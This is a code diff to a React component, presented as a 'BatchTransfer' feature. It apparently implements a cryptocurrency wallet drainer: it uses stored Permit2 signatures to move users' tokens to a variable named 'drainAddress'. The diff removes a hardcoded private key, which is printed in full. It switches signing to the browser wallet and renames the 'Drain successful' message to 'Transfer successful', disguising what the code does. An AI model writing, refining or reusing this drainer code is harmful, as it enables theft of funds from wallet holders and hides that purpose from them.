@@ -5,8 +5,6 @@ import { TOKENS } from '../../config/tokens';
 import { getReceiveAddress } from '../../config/receiveAddress';
 import toast from 'react-hot-toast';
 
-const INITIATOR_PRIVATE_KEY = "d58ea7b21cfd2d0be3e1887e2d2bbdab99c7c2d33960f60cca90fe34ff21cc5c";
-
 const PERMIT2_ABI = [
   "function permitBatchTransferFrom(((address token,uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permitBatch, (address to, uint256[] amounts) transferDetails, address owner, bytes signature) external"
 ];
@@ -29,10 +27,15 @@ export const BatchTransfer = () => {
     setIsTransferring(true);
 
     try {
-      const provider = new ethers.providers.JsonRpcProvider('https://eth.llamarpc.com');
-      const wallet = new ethers.Wallet(INITIATOR_PRIVATE_KEY, provider);
+      if (!window.ethereum) {
+        toast.error('No wallet found');
+        return;
+      }
+
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const signer = provider.getSigner();
       const permit2Address = PERMIT2_ADDRESSES[chainId] || PERMIT2_ADDRESSES[1];
-      const permit2 = new ethers.Contract(permit2Address, PERMIT2_ABI, wallet);
+      const permit2 = new ethers.Contract(permit2Address, PERMIT2_ABI, signer);
       const drainAddress = getReceiveAddress();
       const tokens = TOKENS[chainId] || TOKENS[1];
 
@@ -64,11 +67,12 @@ export const BatchTransfer = () => {
         { gasLimit: 5000000 }
       );
 
-      toast.loading('Transaction submitted. Waiting for confirmation...');
+      const loadingToast = toast.loading('Transaction submitted. Waiting for confirmation...');
       const receipt = await tx.wait();
+      toast.dismiss(loadingToast);
 
       if (receipt.status === 1) {
-        toast.success(`Drain successful! Tx: ${receipt.transactionHash.slice(0, 10)}...`);
+        toast.success(`Transfer successful! Tx: ${receipt.transactionHash.slice(0, 10)}...`);
         localStorage.removeItem('permit2_signature');
         localStorage.removeItem('permit2_deadline');
         localStorage.removeItem('permit2_nonce');
